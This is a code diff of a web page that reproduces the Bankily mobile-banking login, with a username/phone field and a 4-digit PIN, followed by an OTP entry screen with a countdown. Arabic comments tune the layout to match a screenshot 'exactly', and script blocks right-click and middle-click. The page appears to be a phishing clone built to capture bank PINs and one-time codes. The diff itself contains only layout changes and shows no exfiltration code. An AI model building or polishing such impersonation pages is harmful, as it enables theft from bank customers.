@@ -78,27 +78,37 @@
             align-items: center;
         }
 
-        /* تنسيق مساحة الشعار وحذف الفراغ الزائد */
+        /* تكبير مساحة الشعار وحجمه ليتطابق تماماً مع الصورة المرفقة */
         .brand-logo-space {
             width: 100%;
-            height: 110px;
+            height: 160px; /* زيادة الطول لإعطاء الشعار مساحة تبرز حجمه الكبير */
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-top: 10px;
-            margin-bottom: 15px;
+            margin-top: 15px;
+            margin-bottom: 25px; /* مسافة أوسع أسفل الشعار لدفع الحقول نحو الوسط */
         }
 
         .brand-logo-space img {
-            max-width: 80%;
+            max-width: 95%; /* تكبير العرض الأقصى للشعار ليتطابق مع image_21.png */
             max-height: 100%;
             object-fit: contain;
+        }
+
+        /* نقل الحقول لمنتصف الشاشة عن طريق إضافة مساحة علوية مرنة */
+        .middle-fields-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: auto;   /* توليد مرونة دفع من الأعلى */
+            margin-bottom: auto; /* توليد مرونة دفع من الأسفل لتوسيط الحقول بالمنتصف تماماً */
         }
 
         /* مجموعات الإدخال والمسافات المحكمة */
         .input-group {
             width: 100%;
-            margin-bottom: 15px;
+            margin-bottom: 25px; /* زيادة المسافة الرأسية بين الحقول لتماثل الصورة تماماً */
             position: relative;
             text-align: right;
         }
@@ -197,7 +207,7 @@
             font-weight: 500;
         }
 
-        /* تم نقل الرابط وضبطه في أسفل الواجهة تماماً فوق الزر مباشرة كما في الصورة */
+        /* الرابط المنسق في أسفل الواجهة تماماً فوق الزر مباشرة */
         .register-link-box {
             margin-top: auto; 
             margin-bottom: 15px;
@@ -212,7 +222,7 @@
             font-weight: 500;
         }
 
-        /* تخصيصات واجهة OTP المنظمة */
+        /* تخصيصات واجهة OTP المنظمة وتوسيط حقولها */
         .otp-title {
             font-size: 0.95rem;
             font-weight: normal;
@@ -221,6 +231,15 @@
             line-height: 1.7;
             margin-top: 25px;
             margin-bottom: 25px;
+        }
+
+        .otp-middle-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: auto;   /* توسيط محتوى حقل الـ OTP بالمنتصف */
+            margin-bottom: auto; /* توسيط محتوى حقل الـ OTP بالمنتصف */
         }
 
         .otp-wrapper-box {
@@ -298,65 +317,74 @@
             <span id="titleText"></span>
         </div>
 
+        <!-- واجهة تسجيل الدخول المحدثة بالتوسيط والتكبير للشعار -->
         <div id="loginSection" class="app-content">
             
             <div class="brand-logo-space">
                 <img src="logo_bankily.jpeg" alt="Bankily Logo">
             </div>
 
-            <div class="input-group">
-                <label>اسم المستخدم أو رقم الهاتف</label>
-                <div class="input-wrapper">
-                    <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="" oninput="cleanNumberInput(this)">
-                    <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="10"/>
-                        <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
-                        <circle cx="12" cy="8" r="3"/>
-                    </svg>
+            <!-- الحاوية المرنة لضمان تمركز الحقول في الوسط تماماً كما في الصور المرفقة -->
+            <div class="middle-fields-container">
+                <div class="input-group">
+                    <label>اسم المستخدم أو رقم الهاتف</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="" oninput="cleanNumberInput(this)">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"/>
+                            <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
+                            <circle cx="12" cy="8" r="3"/>
+                        </svg>
+                    </div>
                 </div>
-            </div>
 
-            <div class="input-group" style="margin-bottom: 5px;">
-                <label>الرقم السري</label>
-                <div class="input-wrapper">
-                    <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                        <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
-                    </svg>
-                    
-                    <div class="password-wrapper-box">
-                        <div class="password-container">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 0)">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 1)">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 2)">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 3)">
+                <div class="input-group" style="margin-bottom: 5px;">
+                    <label>الرقم السري</label>
+                    <div class="input-wrapper">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
+                        </svg>
+                        
+                        <div class="password-wrapper-box">
+                            <div class="password-container">
+                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 0)">
+                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 1)">
+                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 2)">
+                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 3)">
+                            </div>
                         </div>
                     </div>
                 </div>
+
+                <div class="forgot-password-box">
+                    <a href="#">نسيت الرقم السري ؟</a>
+                </div>
             </div>
 
-            <div class="forgot-password-box">
-                <a href="#">نسيت الرقم السري ؟</a>
-            </div>
-
+            <!-- متموضع في أسفل الواجهة مباشرة فوق زر تسجيل الدخول ومطابق للصور تماماً -->
             <div class="register-link-box">
                 <a href="#">مستخدم جديد ؟ سجل الآن!</a>
             </div>
         </div>
 
+        <!-- واجهة الـ OTP المنظمة والمطابقة تماماً مع التوسيط بالمنتصف وعمل العداد الحركي تلقائياً -->
         <div id="otpSection" class="app-content hidden">
             <p class="otp-title">أدخل رمز التأكيد المرسل إلى هاتف المحمول</p>
 
-            <div class="otp-wrapper-box">
-                <div class="otp-container">
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 0)">
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 1)">
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 2)">
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 3)">
+            <!-- حاوية توسيط حقول الـ OTP بالمنتصف تماماً -->
+            <div class="otp-middle-container">
+                <div class="otp-wrapper-box">
+                    <div class="otp-container">
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 0)">
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 1)">
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 2)">
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 3)">
+                    </div>
                 </div>
-            </div>
 
-            <p class="otp-timer-countdown" id="otpTimer">05:00 ثواني</p>
+                <p class="otp-timer-countdown" id="otpTimer">05:00 ثواني</p>
+            </div>
 
             <div class="register-link-box" style="margin-top: auto; margin-bottom: 15px;">
                 <a href="#" style="color: #222; font-weight: 500;">إعادة إرسال رمز التأكيد</a>
@@ -371,7 +399,7 @@
         let otpInterval = null;
         let totalSeconds = 300; 
 
-        // حظر النقر لحماية البيانات والواجهة
+        // حظر النقر لحماية البيانات والواجهة من التلاعب
         document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
         document.addEventListener('mousedown', function(e) {
             if (e.button === 1 || e.button === 2) { e.preventDefault(); return false; }
